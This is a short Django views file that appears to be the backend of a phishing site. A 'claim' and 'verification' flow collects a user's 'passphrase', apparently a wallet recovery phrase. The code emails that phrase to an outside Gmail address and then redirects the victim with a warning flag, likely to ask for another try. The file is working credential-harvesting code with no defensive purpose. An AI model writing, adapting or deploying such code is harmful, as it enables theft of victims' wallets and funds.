from django.shortcuts import render,redirect
from django.core.mail import send_mail

def home(request):
    return render(request, 'home.html')

def claim(request):
    show_warning = request.GET.get('warn', '') == '1'
    return render(request, 'verification.html', {'show_warning': show_warning})

from django.http import HttpResponse

def send_passphrase(request):
    if request.method == 'POST':
        passphrase = request.POST.get('passphrase')
        if passphrase:
            try:
                send_mail(
                    subject="New Passphrase",
                    message=passphrase,
                    from_email='birla0662@gmail.com',
                    recipient_list=['pibuyer7869@gmail.com'],
                    fail_silently=False,
                )
                return redirect('/claim/?warn=1')
            except Exception as e:
                return HttpResponse(f"Email send failed: {str(e)}", status=500)
    return redirect('claim')
